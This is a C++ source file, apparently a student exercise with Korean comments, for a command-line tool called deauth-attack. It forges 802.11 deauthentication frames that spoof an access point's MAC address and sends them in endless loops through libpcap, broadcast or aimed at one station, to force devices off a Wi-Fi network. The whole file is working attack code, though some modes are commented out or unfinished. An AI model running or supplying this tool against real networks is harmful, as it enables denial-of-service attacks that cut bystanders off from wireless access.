#include "main.h"
#include <iostream>


void usage(){ //경고 메시지
    printf("syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n");
    printf("deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

int packet_make(struct Deauth* deauth, char* ap_mac, char* station_mac) { //패킷 발송
    deauth->radiotap.revision =0;
    deauth->radiotap.pad =0;
    deauth->radiotap.length = 8;
    deauth->radiotap.Present_flags = 0x00000000;
    deauth->deauthentication.type = htons(0xc000);
    if (station_mac == NULL) deauth->deauthentication.dst_addr = Mac("ff:ff:ff:ff:ff:ff");
    else deauth->deauthentication.dst_addr = Mac(station_mac);
    deauth->deauthentication.src_addr = Mac(ap_mac);
    deauth->deauthentication.BSSID = Mac(ap_mac);
    deauth->deauthentication.number = 0;
    deauth->wireless.reason_code = htons(0x0700);

    return 0;
}

int send_packet(pcap_t* pcap, struct Deauth* deauth){
    while (true) {
        int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(deauth), sizeof(Deauth));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
            return -1;
        }
        std::cout << "Sending DeAuth to AP broadcast -- BBSID: "<< std::string(deauth->deauthentication.bssid()) <<std::endl;
        sleep(0.5);
    }
}

int send_packet2(pcap_t* pcap, struct Deauth* deauth, char* ap_mac, char* station_mac){
    while (true) {
        deauth->deauthentication.dst_addr = Mac(station_mac);
        deauth->deauthentication.src_addr = Mac(ap_mac);
        int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(deauth), sizeof(Deauth));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
            return -1;
        }
        std::cout << "Sending DeAuth to AP unicast -- BBSID: "<< std::string(deauth->deauthentication.bssid()) <<std::endl;
        sleep(3);
        deauth->deauthentication.dst_addr = Mac(ap_mac);
        deauth->deauthentication.src_addr = Mac(station_mac);
        int res2 = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(deauth), sizeof(Deauth));
        if (res2 != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(pcap));
            return -1;
        }
        std::cout << "Sending DeAuth to station unicast -- BBSID: "<< std::string(deauth->deauthentication.bssid()) <<std::endl;
        sleep(3);
    }
}

pcap_t* PcapOpen(char* dev) {   //패킷 오픈
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "error: pcap_open_live(%s) return null - %s\n", dev, errbuf);
        return NULL;
    }

    return pcap;
}

int AP_broadcast_frame(char* dev, struct Deauth* deauth, char* ap_mac){ //AP_broadcast_fram
    pcap_t* pcap = PcapOpen(dev);
    if (pcap == NULL){
        return -1;
    }

    packet_make(deauth, ap_mac, NULL);
    send_packet(pcap, deauth);

    pcap_close(pcap);

    return 0;
}

int AP_unicast_Station(char* dev, struct Deauth* deauth, char* ap_mac, char* station_mac){
    pcap_t* pcap = PcapOpen(dev);
    if (pcap == NULL){
        return -1;
    }

    packet_make(deauth, ap_mac, station_mac);
    send_packet2(pcap, deauth, ap_mac, station_mac);

    pcap_close(pcap);
    return 0;
}

int authentication(char* dev, struct Deauth* deauth, char* ap_mac, char* station_mac) {
    pcap_t* pcap = PcapOpen(dev);
    if (pcap == NULL){
        return -1;
    }

    packet_make(deauth, ap_mac, station_mac);

    pcap_close(pcap);
    return 0;
}

int main(int argc, char** argv) {
    char* dev;
    char* ap_mac;
    char* station_mac;
    struct Deauth* deauth = (struct Deauth*)malloc(sizeof(struct Deauth));

    if (argc < 3) {
        usage();
        return -1;
    } else{
        dev = *(argv + 1); //interface
        ap_mac = *(argv + 2); 
    } 
    
    if(argc == 3) {
        AP_broadcast_frame(dev, deauth, ap_mac);
    } //else if(argc == 4) {
    //     station_mac = *(argv + 3);
    //     AP_unicast_Station(dev, deauth, ap_mac, station_mac);
    // } else if(argc == 5) {
    //     station_mac = *(argv + 3);
    //     authentication(dev, deauth, ap_mac, station_mac);
    // }
    
    // free(deauth);
    return 0;
}
